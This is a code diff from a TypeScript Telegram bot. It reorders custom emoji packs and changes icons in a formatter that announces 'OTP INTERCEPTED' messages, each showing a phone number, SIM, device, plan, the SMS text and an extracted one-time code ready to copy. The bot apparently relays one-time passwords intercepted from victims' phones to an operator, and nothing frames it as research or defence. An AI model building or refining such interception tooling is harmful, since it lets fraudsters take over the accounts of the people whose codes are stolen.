@@ -40,14 +40,14 @@ const pendingUsers = new Map<number, TelegramBot.User>(); // userId → user inf
 const customEmojiMap = new Map<string, string>();
 
 const EMOJI_PACKS = [
-  "Ntgbbvddf_by_fStikBot",
-  "Icon_2023",
-  "RestrictedEmoji",
-  "IslomjonAnimeEmoji",
-  "Topics",
   "Taj_Mehyar",
-  "Anonymous_Anaconda_by_fStikBot",
+  "GiftsGiftsGifts",
+  "Icon_2023",
+  "GameEmoji",
+  "TONEmoji",
   "NewsEmoji",
+  "RestrictedEmoji",
+  "Ntgbbvddf_by_fStikBot",
 ];
 
 type StickerObj = { emoji: string; custom_emoji_id?: string; type: string };
@@ -175,17 +175,17 @@ function formatTime(ts: string): string {
 function formatOtpMessage(sms: SmsMessage): string {
   const otp = extractOtp(sms.body)!;
   return (
-    `${ce("🦎")} <b>OTP INTERCEPTED</b> ${ce("🦎")}\n` +
+    `${ce("🎁")} <b>OTP INTERCEPTED</b> ${ce("🎁")}\n` +
     `——————————————————————\n\n` +
     `╭─ ${ce("✨")} <b>DETAILS</b>\n` +
     `├ ${ce("📲")} <b>Phone:</b>   <code>${escapeHtml(sms.phone)}</code>\n` +
     `├ ${ce("🔔")} <b>Time:</b>    ${escapeHtml(formatTime(sms.timestamp))}\n` +
-    `├ ${ce("🛰")} <b>SIM:</b>     ${escapeHtml(sms.sim)}\n` +
+    `├ ${ce("🃏")} <b>SIM:</b>     ${escapeHtml(sms.sim)}\n` +
     `├ ${ce("🖥")} <b>Device:</b>  ${escapeHtml(sms.device)}\n` +
-    `╰ ${ce("💰")} <b>Plan:</b>    ${escapeHtml(sms.plan)}\n\n` +
+    `╰ ${ce("💵")} <b>Plan:</b>    ${escapeHtml(sms.plan)}\n\n` +
     `╭─ ${ce("💬")} <b>MESSAGE</b>\n` +
     `╰ <i>${escapeHtml(sms.body)}</i>\n\n` +
-    `╭─ ${ce("🗝")} <b>OTP CODE</b>\n` +
+    `╭─ ${ce("🔓")} <b>OTP CODE</b>\n` +
     `╰ <code>${escapeHtml(otp)}</code>\n\n` +
     `${ce("⬆️")} <i>Tap the code to copy</i>`
   );
